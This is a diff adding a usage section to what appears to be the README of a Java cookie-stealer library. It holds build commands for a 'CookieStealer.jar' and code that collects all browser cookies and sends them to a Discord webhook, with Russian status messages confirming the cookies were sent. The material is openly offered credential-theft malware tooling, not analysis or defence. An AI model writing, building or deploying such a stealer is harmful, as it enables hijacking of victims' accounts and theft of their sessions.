@@ -19,3 +19,13 @@ javac -cp "lib/*" -d build src\main\java\org\example\*.java
 echo Main-Class: org.example.CookieStealerLibrary > manifest.txt
 jar cfm CookieStealer.jar manifest.txt -C build .
 and double click on this! This,stealer builded!
+Usage
+
+       List<CookieStealerLibrary.Cookie> cookies = CookieStealerLibrary.getAllCookies();
+        System.out.println("Найдено cookies: " + cookies.size());
+
+
+        boolean sent = CookieStealerLibrary.sendAllCookiesToDiscord("Вэбхук");
+        if (sent) {
+            System.out.println("Отправил куки!");
+        }
